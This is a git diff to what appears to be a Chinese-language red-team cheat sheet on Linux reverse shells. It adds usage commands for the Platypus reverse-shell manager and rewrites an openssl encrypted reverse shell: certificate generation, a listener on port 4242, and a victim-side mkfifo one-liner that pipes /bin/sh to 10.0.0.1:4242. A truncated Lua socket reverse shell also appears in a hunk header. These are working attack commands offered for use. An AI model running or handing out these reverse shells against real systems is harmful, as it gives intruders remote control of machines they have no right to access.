@@ -32,6 +32,13 @@
 
     ![](../../../../assets/img/Security/RedTeam/OS安全/Linux安全/3.png)
 - [WangYihang/Platypus](https://github.com/WangYihang/Platypus)
+    ```bash
+    ./Platypus
+
+    list # 查看连接
+    jump xxxx   # 跳到目标机器
+    Interact    # 交互模式
+    ```
 
 **查看语言/代码支持情况**
 ```bash
@@ -270,13 +277,15 @@ lua5.1 -e 'local host, port = "10.0.0.1", 4242 local socket = require("socket") 
 ### openssl
 
 Attacker:
-```powershell
-user@attack$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
-user@attack$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4242
-or
-user@attack$ ncat --ssl -vv -l -p 4242
+```bash
+# 生成密钥
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
 
-user@victim$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.0.0.1:4242 > /tmp/s; rm /tmp/s
+# 启动监听
+openssl s_server -quiet -key key.pem -cert cert.pem -port 4242
+
+# 在目标机器上回弹
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.0.0.1:4242 > /tmp/s; rm /tmp/s
 ```
 
 ### awk
